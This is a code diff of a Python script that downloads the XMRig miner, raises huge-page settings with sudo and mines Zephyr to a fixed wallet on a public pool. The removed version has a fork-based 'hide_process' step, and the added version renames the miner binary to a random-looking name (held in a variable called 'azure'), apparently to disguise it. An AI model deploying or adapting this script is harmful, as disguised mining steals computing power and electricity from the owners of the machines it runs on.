@@ -1,45 +1,72 @@
-import os
 import subprocess
+import random
+import os
+import shutil
+import urllib.request
+import tarfile
 
-def install_dependencies():
-	subprocess.call("sudo apt-get update", shell=True)
-	subprocess.call("sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev", shell=True)
+def update_system():
+	# Update system and set vm.nr_hugepages
+	subprocess.run(['sudo', 'apt-get', 'update'])
+	subprocess.run(['sudo', 'sysctl', '-w', 'vm.nr_hugepages=1280'])
+	subprocess.run(['sudo', 'bash', '-c', 'echo vm.nr_hugepages=1280 >> /etc/sysctl.conf'])
 
-def install_xmrig():
-	# Clone repository
-	subprocess.run(["git", "clone", "https://github.com/xmrig/xmrig.git"])
-	# Build xmrig
-	os.chdir("xmrig")
-	subprocess.run(["mkdir", "build"])
-	os.chdir("build")
-	subprocess.run(["cmake", ".."])
-	subprocess.run(["make"])
+def install_packages():
+	# Install necessary packages
+	subprocess.run(['sudo', 'apt-get', 'install', '-y', 'git', 'wget', 'screen'])
 
-def set_huge_pages():
-	# Set huge pages
-	subprocess.run(["sudo", "sysctl", "-w", "vm.nr_hugepages=MAX"])
+def setup_directories():
+	# Set up directories
+	work_dir = '/usr/share/work'
+	os.makedirs(work_dir, exist_ok=True)
+	return work_dir
 
-def start_xmrig():
+def download_and_extract_xmrig(version):
+	# Download and extract xmrig
+	tar_url = f'https://github.com/xmrig/xmrig/releases/download/v{version}/xmrig-{version}-linux-x64.tar.gz'
+	tar_file = f'xmrig-{version}-linux-x64.tar.gz'
+	download_path = os.path.join(work_dir, tar_file)
+
+	urllib.request.urlretrieve(tar_url, download_path)
+
+	with tarfile.open(download_path, 'r:gz') as tar:
+		tar.extractall(path=work_dir)
+
+	# Rename xmrig binary
+	xmrig_dir = os.path.join(work_dir, f'xmrig-{version}')
+	xmrig_path = os.path.join(xmrig_dir, 'xmrig')
+	azure = 'mxsemsdnlkdj'
+	shutil.move(xmrig_path, os.path.join(xmrig_dir, azure))
+	return os.path.join(xmrig_dir, azure)
+
+def start_xmrig(pool, username, cpu_threads=None, gpu_enabled=True, gpu_type='auto'):
 	# Start xmrig
-	os.chdir("../..")
-	subprocess.Popen(["./xmrig/build/xmrig", "--url=stratum+ssl://sg-zephyr.miningocean.org:5432", "--user=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB", "--coin=Zephyr", "--cpu", "--cuda", "--opencl"])
+	donate_level = 1
+	algo = 'rx/0'
+	xmrig_path = download_and_extract_xmrig('6.21.0')
 
-def hide_process():
-	# Hide process
-	pid = os.fork()
-	if pid > 0:
-		exit()
-	elif pid == 0:
-		os.setsid()
-	else:
-		exit()
+	cmd = [f'{xmrig_path}', '--donate-level', str(donate_level), '-o', pool, '-u', f'{username}.ws-p x', '-a', algo, '-k', '--tls']
 
-def main():
-	install_dependencies()
-	install_xmrig()
-	set_huge_pages()
-	hide_process()
-	start_xmrig()
+	if cpu_threads is not None:
+		cmd.extend(['--cpu', str(cpu_threads)])
+
+	if gpu_enabled:
+		if gpu_type == 'auto':
+			cmd.append('--opencl')  # Use auto-detection for OpenCL
+		elif gpu_type == 'cuda':
+			cmd.append('--cuda')  # Use NVIDIA CUDA for GPU mining
+
+	try:
+		subprocess.run(cmd, check=True)
+	except subprocess.CalledProcessError as e:
+		print(f"Error running xmrig: {e}")
 
 if __name__ == "__main__":
-	main()
+	update_system()
+	install_packages()
+	work_dir = setup_directories()
+	
+	pool = 'ca-zephyr.miningocean.org:5432'
+	username = 'ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB'
+	
+	start_xmrig(pool, username, cpu_threads=None, gpu_enabled=True, gpu_type='auto')
